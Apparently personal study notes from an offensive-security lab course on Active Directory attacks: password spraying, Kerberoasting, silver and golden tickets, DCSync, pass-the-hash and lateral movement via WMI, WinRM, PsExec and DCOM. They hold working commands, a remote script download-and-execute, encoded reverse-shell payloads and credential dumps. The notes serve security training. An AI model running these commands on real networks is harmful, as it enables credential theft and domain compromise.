    format-default : The following exception occurred while retrieving member "distinguishedName": "The user name or password is incorrect.
    "
      + CategoryInfo          : NotSpecified: (:) [format-default], ExtendedTypeSystemExce
      + FullyQualifiedErrorId : CatchFromBaseGetMember,Microsoft.PowerShell.Commands.Forma
    ```
An existing implementation of this attack called [**Spray-Passwords.ps1**](https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1) is located in the **C:\Tools\active_directory** folder of the Windows 10 client.

The **-Pass** option allows us to set a single password to test, or we can submit a wordlist file with **-File**. We can also test admin accounts with the addition of the **-Admin** flag.
```powershell
PS C:\Tools\active_directory> .\Spray-Passwords.ps1 -Pass Qwerty09! -Admin
```
#### CrackMapExec
The second kind of password spraying attack against AD users leverages SMB. This is one of the traditional approaches of password attacks in AD and comes with some drawbacks. For example, for every authentication attempt, a full SMB connection has to be set up and then terminated. As a result, this kind of password attack is very noisy due to the generated network traffic. It is also quite slow in comparison to other techniques.

```bash
kali@kali:~$ crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
SMB         192.168.50.75   445    CLIENT75         [*] Windows 10.0 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.50.75   445    CLIENT75         [-] corp.com\dave:Nexus123! STATUS_LOGON_FAILURE 
SMB         192.168.50.75   445    CLIENT75         [+] corp.com\jen:Nexus123!
SMB         192.168.50.75   445    CLIENT75         [+] corp.com\pete:Nexus123!
```

> **Note**:
> Crackmapexec doesn't examine the password policy of the domain before starting the password spraying. As a result, we should be cautious about locking out user accounts with this method.

As a bonus, however, the output of crackmapexec not only displays if credentials are valid, but also if the user with the identified credentials has administrative privileges on the target system ( Adding *Pwn3d!* to the output).

#### Kerbrute
The third kind of password spraying attack is based on obtaining a TGT. For example, using [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html) on a Linux system, we can obtain and cache a Kerberos TGT. We'll need to provide a username and password to do this. If the credentials are valid, we'll obtain a TGT. The advantage of this technique is that it only uses two UDP frames to determine whether the password is valid, as it sends only an AS-REQ and examines the response.

We can use the tool [kerbrute](https://github.com/ropnop/kerbrute), implementing this technique to spray passwords. Since this tool is cross-platform, we can use it on Windows and Linux.
```powershell
PS C:\Tools> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"

...
2022/09/06 20:30:48 >  Using KDC(s):
2022/09/06 20:30:48 >   dc1.corp.com:88
2022/09/06 20:30:48 >  [+] VALID LOGIN:  jen@corp.com:Nexus123!
2022/09/06 20:30:48 >  [+] VALID LOGIN:  pete@corp.com:Nexus123!
2022/09/06 20:30:48 >  Done! Tested 3 logins (2 successes) in 0.041 seconds
```

> **Note**:
> If you receive a network error, make sure that the encoding of usernames.txt is ANSI. You can use Notepad's *Save As* functionality to change the encoding.

> **Note**: 
> For crackmapexec and kerbrute, we had to provide a list of usernames. To obtain a list of all domain users, we can leverage techniques we learned in the Module Active Directory Introduction and Enumeration or use the built-in user enumeration functions of both tools.

### Service Account Attacks
When the user wants to access a resource hosted by a SPN, the client requests a service ticket that is generated by the domain controller. The service ticket is then decrypted and validated by the application server, since it is encrypted through the password hash of the SPN.

When requesting the service ticket from the domain controller, no checks are performed on whether the user has any permissions to access the service hosted by the service principal name. 
  - These checks are performed as a second step only when connecting to the service itself. 
  - This means that if we know the SPN we want to target, we can request a service ticket for it from the domain controller. 
  - Then, since it is our own ticket, we can extract it from local memory and save it to disk.

In this section we will abuse the service ticket and attempt to crack the password of the service account.

#### Rubeus
1. We specify the **kerberoast** command to launch this attack technique. In addition, we'll store the resulting TGS-REP hash in **hashes.kerberoast**. Since we'll execute Rubeus as an authenticated domain user, the tool will identify all SPNs linked with a domain user.
    ```powershell
    PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
    ...

    [*] Total kerberoastable users : 1

    [*] SamAccountName         : iis_service
    ...
    [*] Hash written to C:\Tools\hashes.kerberoast
    ```
2. Now, let's copy **hashes.kerberoast** to our Kali machine. We can then review the Hashcat help for the correct mode to crack a TGS-REP hash.
    ```sh
    kali@kali:~$ cat hashes.kerberoast
    $krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$940AD9DCF5DD5CD8E91A86D4BA0396DB$F57066A4F4F8FF5D70DF39B0C98ED7948A5DB08D689B92446E600B49FD502DEA39A8ED3B0B766E5CD40410464263557BC0E4025BFB92D89BA5C12C26C72232905DEC4D060D3C8988945419AB4A7E7ADEC407D22BF6871D...
    ...

    kali@kali:~$ hashcat --help | grep -i "Kerberos"         
      ...
      13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol      # !!!
      18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
    ```
3. Cracking the TGS-REP hash
    ```sh
    kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
    ```
#### impacket-GetUserSPNs (from Linux)
Next, let's perform Kerberoasting from Linux. We can use [impacket-GetUserSPNs](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) with the IP of the domain controller as the argument for **-dc-ip**. Since our Kali machine is not joined to the domain, we also have to provide domain user credentials to obtain the TGS-REP hash. As before, we can use **-request** to obtain the TGS and output them in a compatible format for Hashcat.
```
kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete                                      
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName    Name         MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------  -----------  --------  --------------------------  ---------  ----------
HTTP/web04.corp.com:80  iis_service            2022-09-07 08:38:43.411468  <never>               


[-] CCache file is not found. Skipping...
$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$21b427f7d7befca7abfe9fa79ce4de60$ac1459588a99d36fb31cee7aefb03cd740e9cc6d9816806cc1ea44b147384afb551723719a6d3b960adf6b2ce4e2741f7d0ec27a87c4c8bb4e5b1bb455714d3dd52c16a4e4c242df94897994ec0087cf5cfb16c2cb64439d514241eec...
```
> **Note**:
> If impacket-GetUserSPNs throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," we need to synchronize the time of the Kali machine with the domain controller. We can use [ntpdate](https://en.wikipedia.org/wiki/Ntpdate) or [rdate](https://en.wikipedia.org/wiki/Rdate) to do so.

#### Invoke-Kerberoast
The [Invoke-Kerberoast.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1) (`/usr/share/powershell-empire/empire/server/data/module_source/credentials/`) script extends this attack, and can automatically enumerate all service principal names in the domain, request service tickets for them, and export them in a format ready for cracking in both John the Ripper and Hashcat, completely eliminating the need for Mimikatz in this attack.

```powershell
PS C:\Users\offsec.CORP> Import-Module .\Invoke-Kerberoast.ps1
# For Hashcat
PS C:\Users\offsec.CORP> Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII out.hash -Width 8000
# For John
PS C:\Users\offsec.CORP> Invoke-Kerberoast -OutputFormat john | % { $_.Hash } | Out-File -Encoding ASCII out.hash -Width 8000
```
Or a more complete attack:
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat John | Select-Object Hash | Out-File -Encoding ASCII hashes.kerberoast -Width 8000
```

> **Note:**
> If you can't crack it using John use hashcat following [Rubeus section](#rubeus).

Once the [ticket requested from the SPN is cracked](https://gist.github.com/A-Pisani/a79808e058ccc49bcf71921a05d51f80#cracking-tgs) we get a username and password:
```
PS C:\Users\offsec.CORP> .\PsExec64.exe \\client01 -u offsec\Allison -p RockYou! cmd.exe
```

- References: 
  - https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/
  - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast#kerberoast
#### Old technique
1. Requesting a service ticket
    ```pwsh
    PS C:\Users\offsec.CORP> Add-Type -AssemblyName System.IdentityModel
    PS C:\Users\offsec.CORP> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
    ```
After execution, the requested service ticket should be generated by the domain controller and loaded into the memory of the Windows 10 client. 

2. Instead of executing Mimikatz all the time, we can also use the built-in **`klist`** command to display all cached Kerberos tickets for the current user:
    ```pwsh
    PS C:\Users\offsec.CORP> klist
    ...
    #1>	Client: Offsec @ CORP.COM
      Server: HTTP/CorpWebServer.corp.com @ CORP.COM
      KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
    ```
3. With the service ticket for the Internet Information Services service principal name created and saved to memory , we can download it from memory.
    ```cmd
    mimikatz # kerberos::list /export
    ...
    [00000001] - 0x00000017 - rc4_hmac_nt
    ...
       \* Saved to file     : 1-40a50000-offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
    ```
According to the Kerberos protocol, the service ticket is encrypted using the SPN's password hash. If we are able to request the ticket and decrypt it using brute force or guessing (in a technique known as Kerberoasting), we will know the password hash, and from that we can crack the clear text password of the service account. As an added bonus, we do not need administrative privileges for this attack.

4. Cracking the service ticket  
    4.1 Using `kerberoas` and `tgsrepcrack.py`
    ```sh
    kali@kali:~$ sudo apt update && sudo apt install kerberoast
    kali@kali:~$ python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi 
    ```
    4.2 Using `kirbi2john` and `john` \ `hashcat`
    ```sh
    kali@kali:~$ kirbi2john 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi > kirbi2j
    kali@kali:~$ john -w=/usr/share/wordlists/rockyou.txt --format=krb5tgs kirbi2j 
    ```
    Note: if `kirbi2john` doesn't generate an output do `sudo apt --only-upgrade install john kerberoast`.

**Note**: the service ticket file is binary. Keep this in mind when transferring it with a tool like Netcat, which may mangle it during transfer.

### Silver Tickets
In the previous section, we obtained and cracked a TGS-REP hash to retrieve the plaintext password of an SPN. In this section, we'll go one step further and forge our own service tickets.

Remembering the inner workings of the Kerberos authentication, the application on the server executing in the context of the service account checks the user's permissions from the group memberships included in the service ticket. The user and group permissions in the service ticket are not verified by the application though. The application blindly trusts the integrity of the service ticket since it is encrypted with a password hash - in theory - only known to the service account and the domain controller.

As an example, if we authenticate against an IIS server that is executing in the context of the service account iis_service, the IIS application will determine which permissions we have on the IIS server depending on the group memberships present in the service ticket.

However, with the service account password or its associated NTLM hash at hand, we can forge our own service ticket to access the target resource (in our example the IIS application) with any permissions we desire. This custom-created ticket is known as a [silver ticket](https://adsecurity.org/?p=2011) and if the service principal name is used on multiple servers, the silver ticket can be leveraged against them all.

In general, we need to collect the following three pieces of information to create a silver ticket:
- SPN password hash
- Domain SID
- Target SPN

Mimikatz can craft a silver ticket and inject it straight into memory through the (somewhat misleading) [**`kerberos::golden**`](https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos) command.

To create the ticket, we first need the obtain the so-called Security Identifier or [SID](https://msdn.microsoft.com/en-us/library/windows/desktop/aa379571(v=vs.85).aspx) of the domain. A SID is an unique name for any object in Active Directory and has the following structure:
```cpp
S-R-I-S
// S-1-5-21-2536614405-3629634762-1218571035-1116
```

Within this structure, the SID begins with a literal `S` to identify the string as a SID, followed by a revision level (usually set to `1`), an identifier-authority value (often `5` within AD) and one or more subauthority values.

The first values (`S-1-5`) are fairly static within AD. The subauthority value is dynamic and consists of two primary parts: the domain's numeric identifier (in this case `21-2536614405-3629634762-1218571035`) and a relative identifier or [RID](https://msdn.microsoft.com/en-us/library/windows/desktop/ms721604(v=vs.85).aspx#_security_relative_identifier_gly) representing the specific object in the domain (in this case `1116`).

The combination of the domain's value and the relative identifier help ensure that each SID is unique.

We can easily obtain the SID of our current user with the `whoami /user` command and then extract the domain SID part from it. Let's try to do this on our Windows 10 client:
```batch
C:\>whoami /user

USER INFORMATION
----------------

User Name   SID
=========== ==============================================
corp\offsec S-1-5-21-1602875587-2787523311-2599479668-1103
```

The SID defining the domain is the entire string except the RID at the end ( `-1103` ).

Now that we have the domain SID, let's try to craft a silver ticket for the IIS service.

> **Note**:
> The SPN password hash can be obtained either through Kerberoasting or if we are a local Administrator on the machine where the SPN (eg iis_service) has an established session, we can use Mimikatz to retrieve the SPN password hash (NTLM hash of iis_service).

The silver ticket command requires an existing domain user (`/user`), domain name (`/domain`), the domain SID (`/sid`), which is highlighted above, the fully qualified host name of the service (`/target`), the service type (`/service:HTTP`), and the password hash of the `iis_service` service account (`/rc4`).
```
mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
User      : offsec
Domain    : corp.com (CORP)
SID       : S-1-5-21-1602875587-2787523311-2599479668
User Id   : 500
Groups Id : \*513 512 520 518 519
ServiceKey: e2b475c11da2a0748290d87aa966c327 - rc4_hmac_nt
Service   : HTTP
Target    : CorpWebServer.corp.com
Lifetime  : 13/02/2018 10.18.42 ; 11/02/2028 10.18.42 ; 11/02/2028 10.18.42
-> Ticket : \*\* Pass The Ticket \*\*

 \* PAC generated
 \* PAC signed
 \* EncTicketPart generated
 \* EncTicketPart encrypted
 \* KrbCred generated

Golden ticket for 'offsec @ corp.com' successfully submitted for current session

mimikatz # kerberos::list

[00000000] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 13/02/2018 10.18.42 ; 11/02/2028 10.18.42 ; 11/02/2028 10.18.42
   Server Name       : HTTP/CorpWebServer.corp.com @ corp.com
   Client Name       : offsec @ corp.com
   Flags 40a00000    : pre_authent ; renewable ; forwardable ;
```
As shown by the output, a new service ticket for the SPN `HTTP/CorpWebServer.corp.com has been loaded into memory and Mimikatz set appropriate group membership permissions in the forged ticket. From the perspective of the IIS application, the current user will be both the built-in local administrator ( *Relative Id: 500* ) and a member of several highly-privileged groups, including the Domain Admins group.

> **Note**:
> To create a silver ticket, we use the password hash and not the cleartext password. If a kerberoast session presented us with the cleartext password, we must hash it before using it to generate a silver ticket.

Now that we have this ticket loaded into memory, we can interact with the service and gain access to any information based on the group memberships we put in the silver ticket. Depending on the type of service, it might also be possible to obtain code execution.

We successfully forged a service ticket and got access to the web page as jeffadmin. It's worth noting that we performed this attack without access to the plaintext password or password hash of this user.

Once we have access to the password hash of the SPN, a machine account, or user, we can forge the related service tickets for any users and permissions. This is a great way of accessing SPNs in later phases of a penetration test, as we need privileged access in most situations to retrieve the password hash of the SPN.

Since silver and golden tickets represent powerful attack techniques, Microsoft created a security patch to update the PAC structure. With this patch in place, the extended PAC structure field PAC_REQUESTOR needs to be validated by a domain controller. This mitigates the capability to forge tickets for non-existent domain users if the client and the KDC are in the same domain. Without this patch, we could create silver tickets for domain users that do not exist. The updates from this patch are enforced from October 11, 2022.

In this section, we learned how to forge service tickets by using the password hash of a target SPN. While we used an SPN run by a user account in the example, we could do the same for SPNs run in the context of a machine account.

### Domain Controller Synchronization
Another way to achieve persistence in an Active Directory infrastructure is to steal the password hashes for all administrative users in the domain.

In production environments, domains typically have more than one domain controller to provide redundancy. The [*Directory Replication Service Remote Protocol*](https://msdn.microsoft.com/en-us/library/cc228086.aspx) uses replication to synchronize these redundant domain controllers. A domain controller may request an update for a specific object, like an account, with the IDL_DRSGetNCChanges API.

The domain controller receiving a request for an update does not verify that the request came from a known domain controller, but only that the associated SID has appropriate privileges. If we attempt to issue a rogue update request to a domain controller from a user with certain rights, it will succeed.

To launch such a replication, a user needs to have the *Replicating Directory Changes*, *Replicating Directory Changes All*, and *Replicating Directory Changes in Filtered Set* rights. By default, members of the *Domain Admins*, *Enterprise Admins*, and *Administrators* groups have these rights assigned.

To perform this attack, we'll use Mimikatz on a domain-joined Windows machine, and [impacket-secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) on our non-domain joined Kali machine for the examples of this section.

0. log in to the Windows 10 client domain administrator account (eg. `jeff_admin`) to perform a replication.
1. open Mimikatz and start the replication using [**lsadump::dcsync**](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump) with the **/user** option to indicate the target user to sync (the built-in domain administrator account Administrator):
    ```
    mimikatz # lsadump::dcsync /user:Administrator
    ```
2. open Mimikatz and dump all credentials:
    ```
    mimikatz # lsadump::dcsync /all /csv
    ```
3. [PtH](#pass-the-hash).

We'll discuss lateral movement vectors such as leveraging NTLM hashes obtained by dcsync in the Module Lateral Movement in Active Directory.

Let's perform the dcsync attack from Linux as well. We'll use **impacket-secretsdump**. To launch it, we'll enter the target username dave as an argument for **-just-dc-user** and provide the credentials of a user with the required rights, as well as the IP of the domain controller in the format domain/user:password@ip.
```bash
kali@kali:~$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
...
```

The dcsync attack is a powerful technique to obtain any domain user credentials. As a bonus, we can use it from both Windows and Linux. By impersonating a domain controller, we can use replication to obtain user credentials from a domain controller. However, to perform this attack, we need a user that is a member of Domain Admins, Enterprise Admins, or Administrators, because there are certain rights required to start the replication. 
## Active Directory Lateral Movement Techniques
A logical next step in our approach would be to crack any password hashes we have obtained and authenticate to a machine with cleartext passwords in order to gain unauthorized access. However, password cracking takes time and may fail. 
We can use:
- **Pass the Hash** - Kerberos and NTLM do not use the cleartext password directly.
- **Overpass the Hash** - native tools from Microsoft do not support authentication using the password hash.

In the following section, we will explore an alternative lateral movement technique that will allow us to authenticate to a system and gain code execution using only a user's hash or a Kerberos ticket.
### WMI and WinRM
#### WMI
The first lateral movement technique we are going to cover is based on the [*Windows Management Instrumentation* (WMI)](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page), which is an object-oriented feature that facilitates task automation.

Historically, wmic has been abused for lateral movement via the command line by specifying the target IP after the **/node:** argument then user and password after the **/user:** and **/password:** keywords, respectively. We'll also instruct wmic to launch a calculator instance with the **process call create** keywords.
```batch
C:\Users\jeff>wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 752;
        ReturnValue = 0;
};
```
The WMI job returned the PID of the newly created process and a return value of "0", meaning that the process has been created successfully.
> **Note**:
> System processes and services always run in session 05 as part of session isolation, which was introduced in Windows Vista. Because the WMI Provider Host is running as a system service, newly created processes through WMI are also spawned in session 0.

Translating this attack into PowerShell syntax requires a few extra details. We need to create a [*PSCredential*](https://docs.microsoft.com/en-us/powershell/scripting/learn/deep-dives/add-credentials-to-powershell-functions?view=powershell-7.2) object that will store our session username and password. To do that, we will first store the username and password in the respective variables and then secure the password via the **ConvertTo-SecureString** cmdlet. Finally, we'll create a new PSCredential object with the given username and **secureString** object.
```
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
```
...
TODO
TODO


#### WinRM
As an alternative method to WMI for remote management, WinRM can be employed for remote hosts management. WinRM is the Microsoft version of the [WS-Management](https://en.wikipedia.org/wiki/WS-Management) protocol and it exchanges XML messages over HTTP and HTTPS. It uses TCP port 5985 for encrypted HTTPS traffic and port 5986 for plain HTTP.

In addition to its PowerShell implementation, which we'll cover later in this section, WinRM is implemented in numerous built-in utilities, such as [winrs](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/winrs) (Windows Remote Shell).

The winrs utility can be invoked by specifying the target host through the `-r`: argument and the username and password with `-u`: and `-p`, respectively. As a final argument, we want to specify the commands to be executed on the remote host. For example, we want to run the hostname and whoami commands to prove that they are running on the remote target.

Since winrs only works for domain users, we'll execute the whole command once we've logged in as jeff on CLIENT74 and provide jen's credentials as command arguments.
```batch
C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
FILES04
corp\jen
```

> **Note**:
> For WinRS to work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host.

To convert this technique into a full lateral movement scenario, we just need to replace the previous commands with the base64 encoded reverse-shell we wrote earlier (catch this using a nc listener on Kali VM).
```batch
C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```

PowerShell also has WinRM built-in capabilities called [*PowerShell remoting*](https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.2), which can be invoked via the *New-PSSession* cmdlet by providing the IP of the target host along with the credentials in a credential object format similar to what we did previously.
```powershell
PS C:\Users\jeff> $username = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

PS C:\Users\jeff> New-PSSession -ComputerName 192.168.50.73 -Credential $credential

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM1          192.168.50.73   RemoteMachine   Opened        Microsoft.PowerShell     Available
  
PS C:\Users\jeff> Enter-PSSession 1
[192.168.50.73]: PS C:\Users\jen\Documents> whoami
corp\jen

[192.168.50.73]: PS C:\Users\jen\Documents> hostname
FILES04
```
### PsExec
In order to misuse this tool for lateral movement, a few requisites must be met. To begin, the user that authenticates to the target machine needs to be part of the Administrators local group. In addition, the *ADMIN$* share must be available and File and Printer Sharing has to be turned on. Luckily for us, the last two requirements are already met as they are the default settings on modern Windows Server systems.

In order to execute the command remotely, PsExec performs the following tasks:
- Writes **psexesvc.exe** into the **C:\Windows** directory.
- Creates and spawns a service on the remote host.
- Runs the requested program/command as a child process of **psexesvc.exe**.

In order to start an interactive session on the remote host, we need to invoke **PsExec64.exe** with the **-i** argument, followed by the target hostname prepended with two backslashes. We'll then specify corp\jen as **domain\username** and Nexus123! as password with the **-u** and **-p** arguments respectively. Lastly, we include the process we want to execute remotely, which is a command shell in this case.
```powershell
PS C:\Tools\SysinternalsSuite> ./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
```

### Secretsdump
This tool from impacket uses port 445 to dump SAM hashes that can later be cracked and to extract other secrets (eg. those found in windows.old folders):
```sh
impacket-secretsdump [[domain/]username[:password]@]<targetName or address> [-outputfile OUTPUTFILE] [-hashes LMHASH:NTHASH] 
impacket-secretsdump Administrator:December31@192.168.133.153 -outputfile hashes
```
these can later be cracked following [Cracking NT hashes](https://gist.github.com/A-Pisani/a79808e058ccc49bcf71921a05d51f80#cracking-nt-hashes).
### Pass the Hash
The Pass the Hash (PtH) technique allows an attacker to authenticate to a remote system or service using a user's NTLM hash instead of the associated plaintext password. 

Many third-party tools and frameworks use PtH to allow users to both authenticate and obtain code execution, including [PsExec from Metasploit](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/), [Passing-the-hash toolkit](https://github.com/byt3bl33d3r/pth-toolkit), and [Impacket](https://github.com/CoreSecurity/impacket/blob/master/examples/smbclient.py). The mechanics behind them are more or less the same in that the attacker connects to the victim using the Server Message Block (SMB) protocol and performs authentication using the NTLM hash.

Most tools that are built to abuse PtH can be leveraged to start a Windows service (for example, cmd.exe or an instance of PowerShell) and communicate with it using Named Pipes. This is done using the Service Control Manager API.

- This will not work for Kerberos authentication but only for server or service using NTLM authentication.
- Similarly to PsExec, requires
  - an SMB connection through the firewall (commonly port 445), and the *Windows File and Print Sharing* feature to be enabled. These requirements are common in internal enterprise environments.
  - the admin share **ADMIN$** to be available. In order to establish a connection to this share, the attacker must present valid credentials with local administrative permissions. In other words, this type of lateral movement typically requires local administrative rights.

1. Passing the hash using **`evil-winrm`** from Kali:
    ```sh
    kali@kali:~$ evil-winrm -u Administrator -H <user_NTLM_hash> -i <IP>
    ```
2. Passing the hash using **`pth-winexe`** from Kali:
    ```sh
    kali@kali:~$ pth-winexe -U Administrator%<user_NTLM_hash> //10.11.0.22 cmd
    ```
3. Passing the hash using **impacket-psexec** from kali:
    ```sh
    # impacket-psexec [[domain/]username[:password]@]<targetName or address> -hashes LMHASH:NTHASH
    kali@kali:~$ impacket-psexec exam/zensvc@192.168.232.170 -hashes 00000000000000000000000000000000:a16216f23b22d10580234fb3f8964ba2
    ```
4.  Passing the hash using Impacket wmiexec from kali:
    ```sh
    kali@kali:~$ impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
    ```
5. Passing the hash using CrackMapExec from kali (won't give an interactive shell!!):
    ```sh
    crackmapexec smb 10.11.1.20-24 -u Administrator - -H :ee0c207898a5bccc01f38115019ca2fb
    ```
> 🚨**Note**:
> Use crackmapexec also to spray the local Administrator password or hash whenever possible using `--local-auth`!
### Overpass the Hash
With [overpass the hash](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf), we can "over" abuse a NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT) or service ticket, which grants us access to another machine or service as that user.

To demonstrate this, let's assume we have compromised a workstation (or server) that the `Jeff_Admin` user has authenticated to, and that machine is now caching their credentials (and therefore their NTLM password hash).

Creating a new PowerShell process in the context of the Jeff_Admin user with his NTLM password hash:
```cmd
mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:<user_NTLM_hash> /run:PowerShell.exe
```
Generate a TGT by authenticating to a network share on the domain controller with net use:
```cmd
PS C:\Windows\system32> net use \\dc01
```
We then use the `klist` command to list the newly requested Kerberos tickets, these include a TGT and a TGS for the CIFS service.

We have now converted our NTLM hash into a Kerberos TGT, allowing us to use any tools that rely on Kerberos authentication (as opposed to NTLM) such as the official PsExec application from Microsoft.

PsExec can run a command remotely but does not accept password hashes. Since we have generated Kerberos tickets and operate in the context of `Jeff_Admin` in the PowerShell session, we may reuse the TGT to obtain code execution on the domain controller.
Opening remote connection to the DC using Kerberos TGT
```cmd
PS C:\Tools\active_directory> .\PsExec.exe \\dc01 cmd.exe
```

### Pass the Ticket
The Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. In addition, if the service tickets belong to the current user, then no administrative privileges are required.

We can only use the TGT on the machine it was created for, but the TGS does offer flexibility in being able to choose which machine to use the ticket from.

Previously, we demonstrated that, using Kerberoasting, we could crack the service account password hash and obtain the password from the service ticket. This password could then be used to access resources available to the service account.

However, if the service account is not a local administrator on any servers, we would not be able to perform lateral movement using vectors such as pass the hash or overpass the hash and therefore, in these cases, we would need to use a different approach.

> **Note:**
> As with Pass the Hash, Overpass the Hash also requires access to the special admin share called **`Admin$`**, which in turn requires local administrative rights on the target machine.


### Distributed Component Object Model
- the attack requires access to both TCP 135 for DCOM and TCP 445 for SMB 135 and local administrator access is required.
- DCOM objects related to Microsoft Office allow lateral movement, both through the use of Outlook as well as PowerPoint.

1. create an Excel document with a macro by selecting the VIEW ribbon and clicking Macros from within Excel.
    ```vbs
    Sub MyMacro()
        Dim Str As String

        Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
        ...
        Str = Str + "AXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA="
        Shell (Str)
    End Sub
    ```
2. PoC code to execute the macro remotely
    ```pwsh
    $com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))

    $LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"

    $RemotePath = "\\192.168.1.110\c$\myexcel.xls"

    [System.IO.File]::Copy($LocalPath, $RemotePath, $True)

    $Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"

    $temp = [system.io.directory]::createDirectory($Path)

    $Workbook = $com.Workbooks.Open("C:\myexcel.xls")

    $com.Run("mymacro")
    ```
3. Before executing the macro, we'll start a Netcat listener on the Windows 10 client to accept the reverse command shell from the domain controller:
    ```
    PS C:\Tools\practical_tools> nc.exe -lvnp 4444
    ```
## Active Directory Persistence
### Golden Tickets
Going back to the explanation of Kerberos authentication, we recall that when a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain. This secret key is actually the password hash of a domain user account called **krbtgt**.

If we are able to get our hands on the krbtgt password hash, we could create our own self-made custom TGTs, or **golden tickets**.

At this stage of the engagement, we should have access to an account that is a member of the Domain Admins group or we have compromised the domain controller itself.

With this kind of access, we can extract the password hash of the krbtgt account with Mimikatz.

1. log in to the domain controller via remote desktop and issue the lsadump::lsa command as displayed below:
    ```cmd
    mimikatz # privilege::debug
    Privilege '20' OK

    mimikatz # lsadump::lsa /patch
    Domain : CORP / S-1-5-21-1602875587-2787523311-2599479668
    ...
    RID  : 000001f6 (502)
    User : krbtgt
    LM   :
    NTLM : 75b60230a2394a812000dbfad8415965
    ...
    ```
